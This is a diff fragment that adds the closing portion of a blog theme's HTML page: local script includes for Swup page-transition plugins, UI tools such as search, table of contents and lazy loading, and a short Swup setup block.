+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
